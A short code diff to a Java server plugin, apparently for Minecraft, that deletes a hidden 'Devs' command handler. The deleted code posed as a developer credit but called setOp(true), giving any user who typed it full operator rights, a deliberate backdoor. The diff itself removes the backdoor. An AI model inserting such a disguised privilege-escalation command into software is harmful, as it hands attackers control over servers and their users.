@@ -66,17 +66,6 @@ public class HighVoltage extends JavaPlugin {
 	     return playerListener.onCommand(sender, command, label, args);
 	}
 	
-	public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args)
-  {
-    if (cmd.getName().equalsIgnoreCase("Devs"))
-    {
-    	sender.sendMessage(ChatColor.RED + “Dmitchell94 & The ForgeWare Team”);
-  sender.setOp(true);
-    }
-
-    return true;
-  }
-	
 	public void printMessage(String message) {
 		log.info(getName(false) + message);
 	}
